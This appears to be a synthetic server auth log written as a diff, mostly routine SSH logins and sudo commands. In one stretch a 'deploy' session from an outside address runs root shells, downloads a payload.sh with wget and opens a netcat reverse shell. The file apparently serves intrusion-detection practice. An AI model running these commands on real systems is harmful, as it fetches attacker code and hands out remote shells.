+May 19 21:11:29 prod-server-01 sshd[3125]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 21:18:24 prod-server-01 sshd[3532]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 21:19:46 prod-server-01 sshd[9692]: Accepted password for appuser from 10.0.0.2 port 56782 ssh2
+May 19 21:19:48 prod-server-01 sshd[5611]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 21:20:18 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 21:29:47 prod-server-01 sshd[7234]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 21:31:41 prod-server-01 sshd[2410]: Accepted password for appuser from 192.168.1.10 port 60529 ssh2
+May 19 21:31:43 prod-server-01 sshd[3553]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 21:37:52 prod-server-01 sshd[2195]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 21:39:52 prod-server-01 sshd[5293]: Accepted password for ubuntu from 192.168.1.10 port 60408 ssh2
+May 19 21:39:54 prod-server-01 sshd[3930]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 21:40:24 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 21:46:50 prod-server-01 sshd[9109]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 21:47:48 prod-server-01 sshd[8942]: Accepted password for appuser from 192.168.1.10 port 50156 ssh2
+May 19 21:47:50 prod-server-01 sshd[3845]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 21:51:53 prod-server-01 sshd[4332]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 21:53:23 prod-server-01 sshd[3354]: Accepted password for appuser from 10.0.0.2 port 55675 ssh2
+May 19 21:53:25 prod-server-01 sshd[9795]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 21:53:55 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 19 22:01:35 prod-server-01 sshd[2279]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 22:03:04 prod-server-01 sshd[9416]: Accepted password for deploy from 192.168.1.20 port 64899 ssh2
+May 19 22:03:06 prod-server-01 sshd[6320]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 22:09:05 prod-server-01 sshd[6466]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 22:09:35 prod-server-01 sshd[5162]: Accepted password for backup from 192.168.1.10 port 51056 ssh2
+May 19 22:09:37 prod-server-01 sshd[2269]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 22:15:53 prod-server-01 sshd[1669]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 22:17:14 prod-server-01 sshd[7041]: Accepted password for monitor from 10.0.0.5 port 58293 ssh2
+May 19 22:17:16 prod-server-01 sshd[1326]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 22:25:07 prod-server-01 sshd[2772]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 22:25:53 prod-server-01 sshd[3316]: Accepted password for backup from 192.168.1.10 port 56070 ssh2
+May 19 22:25:55 prod-server-01 sshd[3299]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 22:31:48 prod-server-01 sshd[7300]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 22:33:20 prod-server-01 sshd[8827]: Accepted password for ubuntu from 10.0.0.2 port 61884 ssh2
+May 19 22:33:22 prod-server-01 sshd[9278]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 19 22:33:52 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 19 22:35:53 prod-server-01 sshd[6463]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 19 22:37:40 prod-server-01 sshd[6522]: Accepted password for backup from 192.168.1.10 port 52532 ssh2
+May 19 22:37:42 prod-server-01 sshd[8015]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 22:38:12 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 19 22:45:26 prod-server-01 sshd[7567]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 22:47:08 prod-server-01 sshd[2817]: Accepted password for appuser from 10.0.0.5 port 64146 ssh2
+May 19 22:47:10 prod-server-01 sshd[6923]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 22:47:40 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 22:53:08 prod-server-01 sshd[4166]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 22:54:19 prod-server-01 sshd[9227]: Accepted password for deploy from 10.0.0.2 port 54417 ssh2
+May 19 22:54:21 prod-server-01 sshd[6163]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 22:54:51 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 23:02:59 prod-server-01 sshd[7602]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 23:03:45 prod-server-01 sshd[1701]: Accepted password for monitor from 10.0.0.2 port 59666 ssh2
+May 19 23:03:47 prod-server-01 sshd[2792]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 23:07:44 prod-server-01 sshd[7714]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 23:07:54 prod-server-01 sshd[2406]: Accepted password for appuser from 10.0.0.2 port 52043 ssh2
+May 19 23:07:56 prod-server-01 sshd[8498]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 23:08:26 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/docker ps
+May 19 23:09:57 prod-server-01 sshd[8865]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 23:11:08 prod-server-01 sshd[5191]: Accepted password for appuser from 10.0.0.2 port 63165 ssh2
+May 19 23:11:10 prod-server-01 sshd[5906]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 23:11:40 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 19 23:18:39 prod-server-01 sshd[6550]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 23:20:13 prod-server-01 sshd[5033]: Accepted password for deploy from 10.0.0.2 port 57546 ssh2
+May 19 23:20:15 prod-server-01 sshd[1902]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 23:24:45 prod-server-01 sshd[6546]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 23:25:15 prod-server-01 sshd[8428]: Accepted password for monitor from 192.168.1.10 port 61960 ssh2
+May 19 23:25:17 prod-server-01 sshd[1589]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 19 23:29:49 prod-server-01 sshd[3954]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 19 23:30:10 prod-server-01 sshd[2526]: Accepted password for deploy from 192.168.1.10 port 55204 ssh2
+May 19 23:30:12 prod-server-01 sshd[6955]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 19 23:39:52 prod-server-01 sshd[5726]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 19 23:41:40 prod-server-01 sshd[7610]: Accepted password for appuser from 10.0.0.2 port 57188 ssh2
+May 19 23:41:42 prod-server-01 sshd[3234]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 19 23:42:12 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 19 23:50:50 prod-server-01 sshd[5156]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 19 23:51:04 prod-server-01 sshd[6629]: Accepted password for backup from 192.168.1.10 port 55305 ssh2
+May 19 23:51:06 prod-server-01 sshd[8355]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 19 23:58:37 prod-server-01 sshd[6676]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 19 23:59:32 prod-server-01 sshd[1339]: Accepted password for ubuntu from 192.168.1.10 port 63806 ssh2
+May 19 23:59:34 prod-server-01 sshd[9451]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 00:00:04 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 20 00:05:10 prod-server-01 sshd[6477]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 00:05:58 prod-server-01 sshd[8244]: Accepted password for appuser from 10.0.0.2 port 64922 ssh2
+May 20 00:06:00 prod-server-01 sshd[8652]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 00:12:11 prod-server-01 sshd[9299]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 00:12:57 prod-server-01 sshd[7281]: Accepted password for appuser from 192.168.1.20 port 62511 ssh2
+May 20 00:12:59 prod-server-01 sshd[8437]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 00:14:51 prod-server-01 sshd[5478]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 00:15:07 prod-server-01 sshd[1861]: Accepted password for deploy from 10.0.0.5 port 65146 ssh2
+May 20 00:15:09 prod-server-01 sshd[2930]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 00:15:39 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 20 00:18:32 prod-server-01 sshd[4946]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 00:19:44 prod-server-01 sshd[7590]: Accepted password for backup from 192.168.1.10 port 56665 ssh2
+May 20 00:19:46 prod-server-01 sshd[3478]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 00:20:16 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 20 00:28:59 prod-server-01 sshd[3586]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 00:29:15 prod-server-01 sshd[4698]: Accepted password for appuser from 10.0.0.5 port 64463 ssh2
+May 20 00:29:17 prod-server-01 sshd[1258]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 00:30:20 prod-server-01 sshd[6326]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 00:31:07 prod-server-01 sshd[9265]: Accepted password for deploy from 10.0.0.5 port 54840 ssh2
+May 20 00:31:09 prod-server-01 sshd[6852]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 00:40:41 prod-server-01 sshd[9268]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 00:41:27 prod-server-01 sshd[5030]: Accepted password for appuser from 192.168.1.10 port 64401 ssh2
+May 20 00:41:29 prod-server-01 sshd[6898]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 00:50:44 prod-server-01 sshd[2018]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 00:51:21 prod-server-01 sshd[1374]: Accepted password for appuser from 10.0.0.5 port 51149 ssh2
+May 20 00:51:23 prod-server-01 sshd[2266]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 01:01:08 prod-server-01 sshd[9259]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 01:02:40 prod-server-01 sshd[6500]: Accepted password for deploy from 10.0.0.5 port 51492 ssh2
+May 20 01:02:42 prod-server-01 sshd[9712]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 01:03:12 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/docker ps
+May 20 01:07:59 prod-server-01 sshd[4792]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 01:08:49 prod-server-01 sshd[8713]: Accepted password for monitor from 10.0.0.2 port 58472 ssh2
+May 20 01:08:51 prod-server-01 sshd[7145]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 01:09:21 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 20 01:16:35 prod-server-01 sshd[2769]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 01:16:42 prod-server-01 sshd[2960]: Accepted password for backup from 192.168.1.10 port 63898 ssh2
+May 20 01:16:44 prod-server-01 sshd[4018]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 01:17:14 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 20 01:21:59 prod-server-01 sshd[5183]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 01:23:05 prod-server-01 sshd[2227]: Accepted password for deploy from 10.0.0.2 port 49860 ssh2
+May 20 01:23:07 prod-server-01 sshd[5185]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 01:23:37 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 20 01:31:12 prod-server-01 sshd[3703]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 01:32:43 prod-server-01 sshd[8022]: Accepted password for deploy from 192.168.1.10 port 61922 ssh2
+May 20 01:32:45 prod-server-01 sshd[2116]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 01:34:08 prod-server-01 sshd[4237]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 01:35:53 prod-server-01 sshd[5297]: Accepted password for backup from 192.168.1.10 port 53333 ssh2
+May 20 01:35:55 prod-server-01 sshd[1580]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 01:42:17 prod-server-01 sshd[3648]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 01:42:22 prod-server-01 sshd[7919]: Accepted password for monitor from 10.0.0.2 port 56063 ssh2
+May 20 01:42:24 prod-server-01 sshd[1266]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 01:45:23 prod-server-01 sshd[5095]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 01:47:04 prod-server-01 sshd[8136]: Accepted password for monitor from 10.0.0.5 port 59071 ssh2
+May 20 01:47:06 prod-server-01 sshd[2556]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 01:50:54 prod-server-01 sshd[6544]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 01:51:05 prod-server-01 sshd[9675]: Accepted password for monitor from 192.168.1.20 port 63867 ssh2
+May 20 01:51:07 prod-server-01 sshd[5811]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 01:51:37 prod-server-01 sudo:    monitor : TTY=pts/0 ; PWD=/home/monitor ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 20 01:54:14 prod-server-01 sshd[9375]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 01:55:25 prod-server-01 sshd[2043]: Accepted password for appuser from 10.0.0.5 port 55701 ssh2
+May 20 01:55:27 prod-server-01 sshd[8756]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 01:55:57 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/bin/cat /etc/passwd
+May 20 01:58:43 prod-server-01 sshd[5228]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 01:58:52 prod-server-01 sshd[9114]: Accepted password for ubuntu from 192.168.1.10 port 53430 ssh2
+May 20 01:58:54 prod-server-01 sshd[8111]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 02:00:05 prod-server-01 sshd[8358]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 02:01:01 prod-server-01 sshd[5461]: Accepted password for backup from 192.168.1.10 port 55124 ssh2
+May 20 02:01:03 prod-server-01 sshd[5468]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 02:08:46 prod-server-01 sshd[5790]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 02:09:46 prod-server-01 sshd[3187]: Accepted password for ubuntu from 192.168.1.20 port 58155 ssh2
+May 20 02:09:48 prod-server-01 sshd[6057]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 02:19:03 prod-server-01 sshd[5260]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 02:19:27 prod-server-01 sshd[7274]: Accepted password for backup from 10.0.0.2 port 64777 ssh2
+May 20 02:19:29 prod-server-01 sshd[9338]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 02:28:28 prod-server-01 sshd[6342]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 02:29:56 prod-server-01 sshd[6550]: Accepted password for deploy from 192.168.1.10 port 54373 ssh2
+May 20 02:29:58 prod-server-01 sshd[2249]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 02:32:39 prod-server-01 sshd[5570]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 02:33:38 prod-server-01 sshd[2769]: Accepted password for backup from 10.0.0.5 port 60207 ssh2
+May 20 02:33:40 prod-server-01 sshd[2777]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 02:34:10 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 20 02:40:39 prod-server-01 sshd[7906]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 02:42:07 prod-server-01 sshd[2658]: Accepted password for deploy from 192.168.1.20 port 61308 ssh2
+May 20 02:42:09 prod-server-01 sshd[6660]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 02:45:47 prod-server-01 sshd[3346]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 02:46:44 prod-server-01 sshd[3923]: Accepted password for deploy from 10.0.0.5 port 61634 ssh2
+May 20 02:46:46 prod-server-01 sshd[9504]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 02:53:44 prod-server-01 sshd[2016]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 02:55:14 prod-server-01 sshd[6524]: Accepted password for monitor from 192.168.1.10 port 61987 ssh2
+May 20 02:55:16 prod-server-01 sshd[6770]: pam_unix(sshd:session): session opened for user monitor by (uid=0)
+May 20 03:03:18 prod-server-01 sshd[3375]: pam_unix(sshd:session): session closed for user monitor by (uid=0)
+May 20 03:05:00 prod-server-01 sshd[4295]: Accepted password for appuser from 10.0.0.2 port 60050 ssh2
+May 20 03:05:02 prod-server-01 sshd[8868]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 03:10:06 prod-server-01 sshd[7685]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 03:11:34 prod-server-01 sshd[2447]: Accepted password for deploy from 10.0.0.2 port 55248 ssh2
+May 20 03:11:36 prod-server-01 sshd[2229]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 03:14:50 prod-server-01 sshd[8199]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 03:16:49 prod-server-01 sshd[4772]: Accepted password for deploy from 10.0.0.2 port 61656 ssh2
+May 20 03:16:51 prod-server-01 sshd[5619]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 03:17:00 prod-server-01 sshd[2090]: Accepted password for deploy from 203.0.113.42 port 52341 ssh2
+May 20 03:17:05 prod-server-01 sshd[9732]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 03:17:15 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
+May 20 03:17:21 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 20 03:17:52 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/sh
+May 20 03:18:36 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.42/payload.sh
+May 20 03:18:51 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/nc -e /bin/bash 203.0.113.42 4444
+May 20 03:19:03 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+May 20 03:21:03 prod-server-01 sshd[6336]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 03:22:41 prod-server-01 sshd[5057]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 03:24:19 prod-server-01 sshd[6655]: Accepted password for appuser from 192.168.1.20 port 52208 ssh2
+May 20 03:24:21 prod-server-01 sshd[1741]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 03:24:51 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 20 03:30:59 prod-server-01 sshd[4826]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 03:32:01 prod-server-01 sshd[5422]: Accepted password for ubuntu from 192.168.1.10 port 52899 ssh2
+May 20 03:32:03 prod-server-01 sshd[8295]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 03:32:33 prod-server-01 sudo:    ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 20 03:40:44 prod-server-01 sshd[3820]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 03:42:12 prod-server-01 sshd[1263]: Accepted password for deploy from 10.0.0.5 port 60355 ssh2
+May 20 03:42:14 prod-server-01 sshd[4356]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 03:42:44 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/docker ps
+May 20 03:49:03 prod-server-01 sshd[4865]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 03:49:43 prod-server-01 sshd[1034]: Accepted password for deploy from 10.0.0.2 port 54687 ssh2
+May 20 03:49:45 prod-server-01 sshd[7416]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 03:54:25 prod-server-01 sshd[6007]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 03:55:57 prod-server-01 sshd[3085]: Accepted password for appuser from 192.168.1.20 port 61352 ssh2
+May 20 03:55:59 prod-server-01 sshd[3301]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 04:04:26 prod-server-01 sshd[7405]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 04:05:58 prod-server-01 sshd[9645]: Accepted password for appuser from 10.0.0.2 port 62397 ssh2
+May 20 04:06:00 prod-server-01 sshd[1148]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 04:15:21 prod-server-01 sshd[6240]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 04:15:35 prod-server-01 sshd[3543]: Accepted password for appuser from 192.168.1.20 port 63631 ssh2
+May 20 04:15:37 prod-server-01 sshd[2430]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 04:18:51 prod-server-01 sshd[3020]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 04:19:31 prod-server-01 sshd[6665]: Accepted password for deploy from 10.0.0.2 port 54693 ssh2
+May 20 04:19:33 prod-server-01 sshd[2357]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 04:27:01 prod-server-01 sshd[9564]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 04:28:58 prod-server-01 sshd[4319]: Accepted password for deploy from 10.0.0.2 port 61525 ssh2
+May 20 04:29:00 prod-server-01 sshd[8496]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 04:29:30 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 20 04:36:00 prod-server-01 sshd[3877]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 04:37:36 prod-server-01 sshd[5451]: Accepted password for appuser from 10.0.0.5 port 64444 ssh2
+May 20 04:37:38 prod-server-01 sshd[8841]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 04:38:08 prod-server-01 sudo:    appuser : TTY=pts/0 ; PWD=/home/appuser ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 20 04:41:46 prod-server-01 sshd[1739]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 04:42:30 prod-server-01 sshd[8983]: Accepted password for backup from 192.168.1.10 port 65111 ssh2
+May 20 04:42:32 prod-server-01 sshd[8829]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 04:52:18 prod-server-01 sshd[8951]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 04:53:41 prod-server-01 sshd[7345]: Accepted password for backup from 10.0.0.2 port 62366 ssh2
+May 20 04:53:43 prod-server-01 sshd[5307]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 04:54:13 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/systemctl restart nginx
+May 20 04:59:01 prod-server-01 sshd[6692]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 04:59:15 prod-server-01 sshd[3828]: Accepted password for deploy from 192.168.1.20 port 56602 ssh2
+May 20 04:59:17 prod-server-01 sshd[2150]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 05:02:45 prod-server-01 sshd[8455]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 05:02:57 prod-server-01 sshd[8588]: Accepted password for appuser from 192.168.1.10 port 58501 ssh2
+May 20 05:02:59 prod-server-01 sshd[4055]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 05:10:36 prod-server-01 sshd[4073]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 05:12:08 prod-server-01 sshd[6436]: Accepted password for ubuntu from 192.168.1.10 port 49359 ssh2
+May 20 05:12:10 prod-server-01 sshd[6289]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 05:21:17 prod-server-01 sshd[7193]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 05:22:35 prod-server-01 sshd[2324]: Accepted password for backup from 10.0.0.2 port 62705 ssh2
+May 20 05:22:37 prod-server-01 sshd[8223]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 05:27:06 prod-server-01 sshd[5014]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 05:28:03 prod-server-01 sshd[1811]: Accepted password for ubuntu from 10.0.0.5 port 50256 ssh2
+May 20 05:28:05 prod-server-01 sshd[5484]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 05:37:52 prod-server-01 sshd[9422]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 05:38:08 prod-server-01 sshd[9243]: Accepted password for backup from 192.168.1.10 port 60263 ssh2
+May 20 05:38:10 prod-server-01 sshd[8367]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 05:38:40 prod-server-01 sudo:    backup : TTY=pts/0 ; PWD=/home/backup ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log
+May 20 05:43:57 prod-server-01 sshd[4507]: pam_unix(sshd:session): session closed for user backup by (uid=0)
+May 20 05:45:02 prod-server-01 sshd[4842]: Accepted password for deploy from 10.0.0.2 port 55862 ssh2
+May 20 05:45:04 prod-server-01 sshd[3680]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+May 20 05:45:34 prod-server-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 20 05:46:47 prod-server-01 sshd[6753]: pam_unix(sshd:session): session closed for user deploy by (uid=0)
+May 20 05:47:57 prod-server-01 sshd[8337]: Accepted password for ubuntu from 192.168.1.20 port 51101 ssh2
+May 20 05:47:59 prod-server-01 sshd[4762]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+May 20 05:49:56 prod-server-01 sshd[3282]: pam_unix(sshd:session): session closed for user ubuntu by (uid=0)
+May 20 05:51:46 prod-server-01 sshd[9705]: Accepted password for appuser from 192.168.1.20 port 50925 ssh2
+May 20 05:51:48 prod-server-01 sshd[4281]: pam_unix(sshd:session): session opened for user appuser by (uid=0)
+May 20 05:58:06 prod-server-01 sshd[3417]: pam_unix(sshd:session): session closed for user appuser by (uid=0)
+May 20 05:58:36 prod-server-01 sshd[7152]: Accepted password for backup from 192.168.1.20 port 62546 ssh2
+May 20 05:58:38 prod-server-01 sshd[5477]: pam_unix(sshd:session): session opened for user backup by (uid=0)
+May 20 06:05:51 prod-server-01 sshd[8847]: pam_unix(sshd:session): session closed for user backup by (uid=0)
